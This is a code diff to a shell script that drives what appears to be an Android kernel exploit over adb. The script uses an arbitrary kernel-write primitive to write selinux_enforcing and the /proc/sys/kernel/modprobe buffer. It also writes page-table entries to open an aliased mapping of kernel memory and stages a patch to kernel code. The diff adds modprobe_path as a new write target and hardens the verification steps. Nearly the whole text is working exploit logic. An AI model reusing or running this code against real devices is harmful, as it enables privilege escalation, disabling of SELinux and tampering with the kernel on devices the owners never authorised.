@@ -39,12 +39,19 @@ if [ "$LOGF" != "" ]; then
 fi
 
 # ---- constants, only if every premise holds ---------------------------------------
-step "0. derive constants (asserts against fw/Image + kallsyms)"
-CONST=$(python3 "$T/pgdalias.py" --shell) || fail "pgdalias.py refused to emit constants -- do not write anything"
+PROFILE=${PROFILE:-6.0.1}
+step "0. derive constants (profile $PROFILE: asserts against the Image + kallsyms + iomem)"
+CONST=$(python3 "$T/pgdalias.py" --profile "$PROFILE" --shell) || fail "pgdalias.py refused to emit constants -- do not write anything"
 eval "$CONST" || fail "pgdalias emitted something that is not KEY=VALUE -- refusing to run on partial constants"
-for v in ALIAS_ENTRY_VA ALIAS_DESC_HEX ALIAS_GATE ALIAS_ISLAND GATE_ORIG_HEX GATE_PATCH_HEX WRI_READV FAULT_READV \
-	 ALIAS_ENTRY_LIST ALIAS_GATE_LIST ALIAS_ISLAND_LIST ALIAS_SELINUX_LIST SELINUX_PRIMARY ENF_ON_HEX ENF_OFF_HEX \
-	 GATE_PRIMARY_VA FLIP_ENTRY_VA FLIP_RO_HEX FLIP_RW_HEX; do
+COMMON_KEYS="ALIAS_ENTRY_VA ALIAS_DESC_HEX ALIAS_GATE ALIAS_ISLAND GATE_ORIG_HEX GATE_PATCH_HEX WRI_READV FAULT_READV \
+	 ALIAS_ENTRY_LIST ALIAS_GATE_LIST ALIAS_ISLAND_LIST GATE_PRIMARY_VA FLIP_ENTRY_VA FLIP_RO_HEX FLIP_RW_HEX \
+	 WITNESS_PRIMARY WITNESS_NAME WITNESS_KIND"
+case "${WITNESS_KIND:-}" in
+	enforce)  KEYS="$COMMON_KEYS ALIAS_SELINUX_LIST SELINUX_PRIMARY ENF_ON_HEX ENF_OFF_HEX" ;;
+	modprobe) KEYS="$COMMON_KEYS ALIAS_WITNESS_LIST" ;;
+	*) fail "pgdalias emitted WITNESS_KIND='${WITNESS_KIND:-}' -- expected enforce or modprobe" ;;
+esac
+for v in $KEYS; do
 	[ -n "${!v:-}" ] || fail "pgdalias did not provide $v"
 	printf '  %-16s %s\n' "$v" "${!v}"
 done
@@ -169,40 +176,80 @@ kwrite() { # kwrite <tries> <addr> <hexpayload> -> "readv/expected"; rc 0 only o
 # channel is dead today" look identical downstream.  selinux_enforcing is the address §159
 # measured as writable, and writing its OWN current value back is a no-op -- if getenforce
 # changes, the write landed wrong and we stop before touching a page table.
-step "2b. sanity: one no-op write to the known-writable .bss word"
-case "$ENF_BASELINE" in
-	Enforcing) SANITY_HEX=01000000 ;;
-	Permissive) SANITY_HEX=00000000 ;;
-	*) fail "getenforce said '$ENF_BASELINE' -- cannot pick a no-op payload"
-esac
-S=$(kwrite 6 0xffffffc00189be74 "$SANITY_HEX") ||
-	fail "the write channel is not landing today ($S) -- do not spend the alias attempt; check §174 hit-rate state"
-printf '  no-op write of %s to selinux_enforcing: %s (readv/expected)\n' "$SANITY_HEX" "$S"
-NOW_ENF=$($ADB shell getenforce | tr -d '\r')
-[ "$NOW_ENF" = "$ENF_BASELINE" ] || fail "getenforce went $ENF_BASELINE -> $NOW_ENF on a no-op payload: the write landed WRONG -- stop"
-printf '  getenforce still %s => the channel lands and the payload was right\n' "$NOW_ENF"
+step "2b. sanity: one no-op write to the known-writable .bss object"
+if [ "$WITNESS_KIND" = "modprobe" ]; then
+	# /proc/sys/kernel/modprobe re-reads the buffer on every cat, so a landed write is visible
+	# from outside the kernel without touching SELinux at all.
+	MOD0=$(timeout 20 $ADB shell cat /proc/sys/kernel/modprobe 2>&1 | tr -d '\r')
+	[ "${#MOD0}" -ge 4 ] || fail "modprobe reads '$MOD0' -- need >=4 printable chars to use it as a witness"
+	case "$MOD0" in *[![:print:]]*) fail "modprobe string has non-printable bytes -- refusing" ;; esac
+	ORIG4_HEX=$(printf '%s' "${MOD0:0:4}" | od -An -tx1 | tr -d ' \n')
+	MUT4_HEX=$(printf '/zz' | od -An -tx1 | tr -d ' \n')00
+	MUT_WANT="/zz"
+	S=$(kwrite 6 "$WITNESS_PRIMARY" "$ORIG4_HEX") ||
+		fail "the write channel is not landing today ($S) -- do not spend the alias attempt"
+	printf '  no-op write of %s (="%s") to %s: %s (readv/expected)\n' "$ORIG4_HEX" "${MOD0:0:4}" "$WITNESS_NAME" "$S"
+	MOD1=$(timeout 20 $ADB shell cat /proc/sys/kernel/modprobe 2>&1 | tr -d '\r')
+	[ "$MOD1" = "$MOD0" ] || fail "$WITNESS_NAME went '$MOD0' -> '$MOD1' on a NO-OP payload: the write landed WRONG -- stop"
+	printf '  %s still "%s" => the channel lands and the payload was right\n' "$WITNESS_NAME" "$MOD1"
+else
+	case "$ENF_BASELINE" in
+		Enforcing) SANITY_HEX="$ENF_ON_HEX" ;;
+		Permissive) SANITY_HEX="$ENF_OFF_HEX" ;;
+		*) fail "getenforce said '$ENF_BASELINE' -- cannot pick a no-op payload"
+	esac
+	S=$(kwrite 6 "$WITNESS_PRIMARY" "$SANITY_HEX") ||
+		fail "the write channel is not landing today ($S) -- do not spend the alias attempt; check §174 hit-rate state"
+	printf '  no-op write of %s to %s: %s (readv/expected)\n' "$SANITY_HEX" "$WITNESS_NAME" "$S"
+	NOW_ENF=$($ADB shell getenforce | tr -d '\r')
+	[ "$NOW_ENF" = "$ENF_BASELINE" ] || fail "getenforce went $ENF_BASELINE -> $NOW_ENF on a no-op payload: the write landed WRONG -- stop"
+	printf '  getenforce still %s => the channel lands and the payload was right\n' "$NOW_ENF"
+fi
 
 read -ra ENTRIES <<< "$ALIAS_ENTRY_LIST"
 read -ra AGATES  <<< "$ALIAS_GATE_LIST"
 read -ra ISLANDS <<< "$ALIAS_ISLAND_LIST"
-read -ra SELXS   <<< "$ALIAS_SELINUX_LIST"
-[ "${#SELXS[@]}" = "${#ENTRIES[@]}" ] || fail "pgdalias emitted ${#ENTRIES[@]} slots but ${#SELXS[@]} selinux aliases"
-
-# The alias must be proven by something a stale cache cannot fake.  Writing the .text island's
-# own zero bytes back only shows readv reached the end -- and today that same signature came from
-# a window aimed at the WRONG physical base (PA 0x80000000 instead of the measured 0x40000000),
-# because a batch whose redirect never happened also consumes the whole feed.  Data reads are
-# coherent, so flipping SELinux through the alias and back is a witness with content.
-if [ "$ENF_BASELINE" = "Enforcing" ]; then
-	OPP_HEX="$ENF_OFF_HEX"; OPP_WANT="Permissive"
+if [ "$WITNESS_KIND" = "modprobe" ]; then
+	read -ra WALS <<< "$ALIAS_WITNESS_LIST"
 else
-	OPP_HEX="$ENF_ON_HEX"; OPP_WANT="Enforcing"
+	read -ra WALS <<< "$ALIAS_SELINUX_LIST"
+	# The alias must be proven by something a stale cache cannot fake.  Writing the .text island's
+	# own zero bytes back only shows readv reached the end -- and today that same signature came from
+	# a window aimed at the WRONG physical base (PA 0x80000000 instead of the measured 0x40000000),
+	# because a batch whose redirect never happened also consumes the whole feed.  Data reads are
+	# coherent, so flipping SELinux through the alias and back is a witness with content.
+	if [ "$ENF_BASELINE" = "Enforcing" ]; then
+		OPP_HEX="$ENF_OFF_HEX"; OPP_WANT="Permissive"
+	else
+		OPP_HEX="$ENF_ON_HEX"; OPP_WANT="Enforcing"
+	fi
+	CUR_HEX="$ENF_ON_HEX"; [ "$ENF_BASELINE" = "Permissive" ] && CUR_HEX="$ENF_OFF_HEX"
 fi
-CUR_HEX="$ENF_ON_HEX"; [ "$ENF_BASELINE" = "Permissive" ] && CUR_HEX="$ENF_OFF_HEX"
+[ "${#WALS[@]}" = "${#ENTRIES[@]}" ] || fail "pgdalias emitted ${#ENTRIES[@]} slots but ${#WALS[@]} witness aliases"
 
-alias_proof() { # alias_proof <alias-VA-of-selinux_enforcing> ; rc 0 only if getenforce moved and came back
-	local selx=$1 now
-	kwrite 4 "$selx" "$OPP_HEX" >/dev/null || { printf 'the flip write did not land'; return 1; }
+alias_proof() { # alias_proof <alias-VA-of-the-witness> ; rc 0 only if the outside read moved and came back
+	local wal=$1 now
+	if [ "$WITNESS_KIND" = "modprobe" ]; then
+		kwrite 4 "$wal" "$MUT4_HEX" >/dev/null || { printf 'the mutate write did not land'; return 1; }
+		sleep 1
+		now=$(timeout 20 $ADB shell cat /proc/sys/kernel/modprobe 2>&1 | tr -d '\r')
+		if [ "$now" != "$MUT_WANT" ]; then
+			printf 'wrote %s through the alias, %s reads "%s" (wanted "%s")' "$MUT4_HEX" "$WITNESS_NAME" "$now" "$MUT_WANT"
+			kwrite 4 "$WITNESS_PRIMARY" "$ORIG4_HEX" >/dev/null   # restore by the proven path
+			return 1
+		fi
+		kwrite 4 "$wal" "$ORIG4_HEX" >/dev/null || { printf 'mutated but the restore write missed'; return 1; }
+		sleep 1
+		now=$(timeout 20 $ADB shell cat /proc/sys/kernel/modprobe 2>&1 | tr -d '\r')
+		if [ "$now" != "$MOD0" ]; then
+			printf 'alias moved it but did not restore ("%s"); fixing via the primary VA' "$now"
+			kwrite 4 "$WITNESS_PRIMARY" "$ORIG4_HEX" >/dev/null
+			return 1
+		fi
+		printf '%s went "%s" -> "%s" -> "%s" through the alias alone' "$WITNESS_NAME" "$MOD0" "$MUT_WANT" "$MOD0"
+		return 0
+	fi
+	kwrite 4 "$wal" "$OPP_HEX" >/dev/null || { printf 'the flip write did not land'; return 1; }
 	sleep 1
 	now=$( $ADB shell getenforce | tr -d '\r' )
 	if [ "$now" != "$OPP_WANT" ]; then
@@ -211,7 +258,7 @@ alias_proof() { # alias_proof <alias-VA-of-selinux_enforcing> ; rc 0 only if get
 		return 1
 	fi
 	now=""
-	kwrite 4 "$selx" "$CUR_HEX" >/dev/null || { printf 'flipped but the restore write missed'; return 1; }
+	kwrite 4 "$wal" "$CUR_HEX" >/dev/null || { printf 'flipped but the restore write missed'; return 1; }
 	sleep 1
 	now=$( $ADB shell getenforce | tr -d '\r' )
 	if [ "$now" != "$ENF_BASELINE" ]; then
@@ -226,15 +273,15 @@ alias_proof() { # alias_proof <alias-VA-of-selinux_enforcing> ; rc 0 only if get
 GATE_TARGET=""
 step "3. open an alias -- try each empty pgd slot, and PROVE it semantically before using it"
 for i in "${!ENTRIES[@]}"; do
-	entry=${ENTRIES[$i]}; agate=${AGATES[$i]}; selx=${SELXS[$i]}
-	printf '  candidate %s: entry=%s gate=%s selinux-alias=%s\n' "$((i + 1))" "$entry" "$agate" "$selx"
+	entry=${ENTRIES[$i]}; agate=${AGATES[$i]}; wal=${WALS[$i]}
+	printf '  candidate %s: entry=%s gate=%s witness-alias=%s (%s)\n' "$((i + 1))" "$entry" "$agate" "$wal" "$WITNESS_NAME"
 	if entry_rc=$(kwrite 4 "$entry" "$ALIAS_DESC_HEX"); then
 		printf '    entry write %s (readv/expected) -- 8 bytes matter, a partial landing would show here\n' "$entry_rc"
 	else
 		printf '    entry write did not land (%s), next candidate\n' "$entry_rc"
 		continue
 	fi
-	if why=$(alias_proof "$selx"); then
+	if why=$(alias_proof "$wal"); then
 		printf '  => alias PROVEN (%s): the window addresses the same bytes as the primary VA\n' "$why"
 		GATE_TARGET="$agate"
 		break
